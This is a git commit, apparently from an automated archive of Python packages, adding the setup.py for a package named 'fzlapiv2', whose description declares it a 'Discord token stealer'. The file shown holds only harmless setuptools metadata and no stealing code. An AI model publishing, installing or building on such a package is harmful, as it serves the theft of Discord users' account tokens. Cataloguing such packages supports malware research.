8a349b360e45103b27a69cf1636b5622625626e3
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 11:22:23 +0000

    Add package fzlapiv2/1.0/fzlapiv2-1.0.tar.gz

---
+++ packages/fzlapiv2/fzlapiv2-1.0.tar.gz/fzlapiv2-1.0/setup.py
@@ -0,0 +1,8 @@
+from setuptools import setup
+
+setup(name='fzlapiv2',
+      version='1.0',
+      description='Discord token stealer',
+      packages=['fzlapiv2'],
+      author_email='nitrobothelper@gmail.com',
+      zip_safe=False)
